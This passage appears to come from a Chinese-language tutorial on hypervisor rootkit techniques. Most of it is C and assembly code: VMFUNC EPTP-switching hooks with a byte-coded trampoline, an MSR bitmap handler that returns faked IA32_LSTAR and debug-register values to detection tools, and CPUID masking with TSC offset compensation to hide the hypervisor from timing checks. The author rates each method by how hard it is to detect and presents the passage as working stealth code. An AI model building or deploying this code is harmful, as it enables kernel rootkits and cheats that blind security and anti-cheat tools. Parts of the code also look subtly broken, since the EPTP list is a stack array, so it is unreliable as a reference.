
VMFUNC 是 Intel 在 Haswell+ 处理器上引入的指令，允许 Guest 在**不触发 VM-Exit** 的情况下切换 EPTP（EPT Pointer），即瞬间切换到不同的物理内存视图。

### 完整实现

```
 // ===== VMCS 配置：启用 VMFUNC =====

void EnableVmfuncInVmcs() {
    // 启用 Secondary Proc-Based Controls 中的 VMFUNC bit
    ULONG64 secondary = __vmx_vmread(VMCS_SECONDARY_PROC_BASED_CONTROLS);
    secondary |= (1ULL << 13); // Enable VMFUNC
    __vmx_vmwrite(VMCS_SECONDARY_PROC_BASED_CONTROLS, secondary);
    
    // VMFUNC Controls: 只启用 function 0 (EPTP Switching)
    __vmx_vmwrite(VMCS_VMFUNC_CONTROLS, 1ULL);
    
    // 配置 EPTP List（最多 512 个 EPTP）
    DECLSPEC_ALIGN(PAGE_SIZE) ULONG64 eptpList[512] = {0};
    
    eptpList[0] = g_cleanEptp.Value;    // Index 0: 干净视图（默认）
    eptpList[1] = g_hookedEptp.Value;   // Index 1: Hook 视图
    
    PHYSICAL_ADDRESS eptpListPhys = MmGetPhysicalAddress(eptpList);
    __vmx_vmwrite(VMCS_EPTP_LIST_ADDRESS, eptpListPhys.QuadPart);
}
```

### Guest 端切换代码

```
// 切换到 Hook 视图（Guest 内核代码调用）
__forceinline void SwitchToHookView() {
    // VMFUNC: EAX=0 (function=EPTP Switching), ECX=1 (EPTP index)
    __asm {
        xor eax, eax    // function 0
        mov ecx, 1      // switch to index 1
        _emit 0x0F      // VMFUNC opcode
        _emit 0x01
        _emit 0xC4
    }
}

// 切换到干净视图
__forceinline void SwitchToCleanView() {
    __asm {
        xor eax, eax
        xor ecx, ecx    // switch to index 0
        _emit 0x0F
        _emit 0x01
        _emit 0xC4
    }
}
```

### 高级应用：自动切换的 Hook Trampoline

// 在 Hook 函数入口自动切换视图，退出时切换回来

// 汇编 Trampoline：
// 1. 进入时切换到干净视图（这样读内存看到的是原始代码）
// 2. 调用真正的 Hook 处理函数
// 3. 退出时切换回 Hook 视图
// 4. 跳转到原始函数（在 Hook 视图中执行原始代码的 trampoline）

```
BYTE g_vmfuncTrampoline[] = {
    // Switch to clean view (index 0)
    0x31, 0xC0,                         // xor eax, eax
    0x31, 0xC9,                         // xor ecx, ecx
    0x0F, 0x01, 0xC4,                   // vmfunc
    
    // Call hook handler (address patched at runtime)
    0xFF, 0x15, 0x02, 0x00, 0x00, 0x00, // call [rip+2]
    0xEB, 0x08,                         // jmp over address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // hook_handler address
    
    // Switch back to hook view (index 1)
    0x31, 0xC0,                         // xor eax, eax
    0xB9, 0x01, 0x00, 0x00, 0x00,       // mov ecx, 1
    0x0F, 0x01, 0xC4,                   // vmfunc
    
    // Jump to original function trampoline (address patched)
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // jmp [rip+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // original_trampoline address
};
```

### 对比普通 EPT Hook

| 维度 | 普通 EPT Hook | VMFUNC EPTP Switching |
| --- | --- | --- |
| 视图切换方式 | EPT Violation → VM-Exit | VMFUNC 指令（无 VM-Exit） |
| 性能开销 | 每次切换 ~1000-3000 cycles | ~100 cycles |
| 时序攻击风险 | 有（VM-Exit 延迟可测量） | 极低（指令级速度） |
| CPU 要求 | VT-x + EPT | Haswell+ (2013+) |
| 复杂度 | 中等 | 高（需要维护多套 EPT） |

### 检测难度：★★★★★+

- 没有 VM-Exit，时序攻击基本无效
- CPUID 可以被拦截来隐藏 VMFUNC 支持
- 目前没有已知的可靠检测方法

---

## 4.3 EPT + MSR Bitmap 联合 Hook

### 原理

VMX 的 MSR Bitmap 可以选择性地让某些 MSR 的读写触发 VM-Exit。配合 EPT Hook，可以拦截任何通过 MSR 实现的功能（性能计数器、电源控制、安全特性等），同时让检测工具读到伪造的 MSR 值。

### 完整实现

```
// MSR Bitmap 结构（4KB 页，4个区域各 1KB）
// 0x000-0x3FF: Low MSRs read  (MSR 0x00000000 - 0x00001FFF)
// 0x400-0x7FF: High MSRs read (MSR 0xC0000000 - 0xC0001FFF)
// 0x800-0xBFF: Low MSRs write
// 0xC00-0xFFF: High MSRs write

DECLSPEC_ALIGN(PAGE_SIZE) UCHAR g_msrBitmap[PAGE_SIZE] = {0};

void SetupMsrBitmap() {
    RtlZeroMemory(g_msrBitmap, PAGE_SIZE);
    
    // 拦截 IA32_LSTAR 的读取（让检测工具看到假值）
    // IA32_LSTAR = 0xC0000082
    // 在 High MSR read bitmap 中: offset = 0x400 + (0x82 / 8) = 0x410, bit = 0x82 % 8 = 2
    g_msrBitmap[0x410] |= (1 << 2);  // RDMSR 触发 VM-Exit
    
    // 也可以拦截写入
    g_msrBitmap[0xC10] |= (1 << 2);  // WRMSR 触发 VM-Exit
    
    // 拦截 IA32_DEBUGCTL (用于隐藏调试特性)
    // 0x1D9 → Low MSR read: offset = 0x000 + (0x1D9 / 8) = 0x3B, bit = 0x1D9 % 8 = 1
    g_msrBitmap[0x3B] |= (1 << 1);
    
    // 写入 VMCS
    PHYSICAL_ADDRESS msrBitmapPhys = MmGetPhysicalAddress(g_msrBitmap);
    __vmx_vmwrite(VMCS_MSR_BITMAP_ADDRESS, msrBitmapPhys.QuadPart);
}
```

```
// VM-Exit Handler: 伪造 MSR 值
void HandleMsrRead(PVMX_VCPU vcpu) {
    ULONG msrIndex = (ULONG)vcpu->guestState.Rcx;
    ULONG64 realValue;
    
    switch (msrIndex) {
        case 0xC0000082: // IA32_LSTAR
            // 返回原始的 KiSystemCall64 地址（即使实际已被修改）
            realValue = g_originalKiSystemCall64;
            break;
            
        case 0x1D9: // IA32_DEBUGCTL
            // 隐藏任何调试相关设置
            realValue = 0;
            break;
            
        default:
            realValue = __readmsr(msrIndex);
            break;
    }
    
    vcpu->guestState.Rax = (ULONG)(realValue & 0xFFFFFFFF);
    vcpu->guestState.Rdx = (ULONG)(realValue >> 32);
    AdvanceGuestRip(vcpu);
}
```

```
// VM-Exit Handler: 拦截 MSR 写入
void HandleMsrWrite(PVMX_VCPU vcpu) {
    ULONG msrIndex = (ULONG)vcpu->guestState.Rcx;
    ULONG64 newValue = ((ULONG64)vcpu->guestState.Rdx << 32) | (vcpu->guestState.Rax & 0xFFFFFFFF);
    
    switch (msrIndex) {
        case 0xC0000082: // IA32_LSTAR
            // 阻止修改（或记录后放行）
            // 如果放行，更新我们的记录
            g_originalKiSystemCall64 = newValue;
            __writemsr(msrIndex, newValue);
            break;
            
        default:
            __writemsr(msrIndex, newValue);
            break;
    }
    AdvanceGuestRip(vcpu);
}
```

### 检测难度：★★★★★

- 检测工具用 rdmsr 读 IA32_LSTAR 看到的是假值
- 配合 EPT Hook，代码也看到是假的
- 双重伪装：代码伪装 + 数据伪装

---

## 4.4 CPUID 虚拟化隐藏 + TSC 补偿

### 原理

Hypervisor 的存在可以通过 CPUID 指令被检测（VMX 会让 CPUID.1:ECX.bit31 = 1）。同时 VM-Exit 会引入可测量的时间延迟。通过拦截 CPUID 和补偿 TSC（时间戳计数器），可以让检测工具完全无法发现 Hypervisor。

### 完整实现

```
// ===== CPUID 伪装 =====
void HandleCpuid(PVMX_VCPU vcpu) {
    int cpuInfo[4];
    __cpuidex(cpuInfo, (int)vcpu->guestState.Rax, (int)vcpu->guestState.Rcx);
    
    ULONG leaf = (ULONG)vcpu->guestState.Rax;
    
    switch (leaf) {
        case 0x1:
            // 清除 Hypervisor Present bit (ECX bit 31)
            cpuInfo[2] &= ~(1 << 31);
            break;
            
        case 0x40000000:
        case 0x40000001:
        case 0x40000002:
        case 0x40000003:
        case 0x40000004:
        case 0x40000005:
        case 0x40000006:
            // 所有 Hypervisor 扩展 leaf 返回 0
            cpuInfo[0] = cpuInfo[1] = cpuInfo[2] = cpuInfo[3] = 0;
            break;
            
        case 0x0:
            // 确保 max leaf 不包含 0x40000000 范围
            if (cpuInfo[0] > 0x20) cpuInfo[0] = 0x20;
            break;
    }
    
    vcpu->guestState.Rax = cpuInfo[0];
    vcpu->guestState.Rbx = cpuInfo[1];
    vcpu->guestState.Rcx = cpuInfo[2];
    vcpu->guestState.Rdx = cpuInfo[3];
    AdvanceGuestRip(vcpu);
}
```

```
// ===== TSC 补偿（隐藏 VM-Exit 延迟）=====
// VM-Exit + VM-Entry 大约消耗 1000-3000 TSC cycles
// 如果检测工具在 VM-Exit 前后读 TSC 对比，可以发现异常延迟

// 方案：在 VMCS 中设置 TSC Offset，每次 VM-Exit 后补偿消耗的时间
typedef struct _TSC_STATE {
    ULONG64 lastExitTsc;      // 上次 VM-Exit 时的 TSC
    ULONG64 totalOffset;      // 累积需要减去的 TSC
} TSC_STATE;

TSC_STATE g_tscState[256] = {0}; // 每个 CPU 一个

void HandleVmExit(PVMX_VCPU vcpu) {
    ULONG64 exitTsc = __rdtsc();
    
    // ... 处理各种 VM-Exit ...
    
    ULONG64 entryTsc = __rdtsc();
    ULONG64 exitCost = entryTsc - exitTsc;
    
    // 将这次 VM-Exit 的时间消耗累加到 TSC Offset
    g_tscState[vcpu->cpuIndex].totalOffset += exitCost;
    
    // 更新 VMCS TSC Offset（Guest 读到的 TSC = 实际 TSC - offset）
    __vmx_vmwrite(VMCS_TSC_OFFSET, -(INT64)g_tscState[vcpu->cpuIndex].totalOffset);
}
```

```
// 还需要处理 RDTSC/RDTSCP 的 VM-Exit（如果启用了 RDTSC exiting）
void HandleRdtsc(PVMX_VCPU vcpu) {
    ULONG64 tsc = __rdtsc() - g_tscState[vcpu->cpuIndex].totalOffset;
    vcpu->guestState.Rax = (ULONG)(tsc & 0xFFFFFFFF);
    vcpu->guestState.Rdx = (ULONG)(tsc >> 32);
    AdvanceGuestRip(vcpu);
}
```
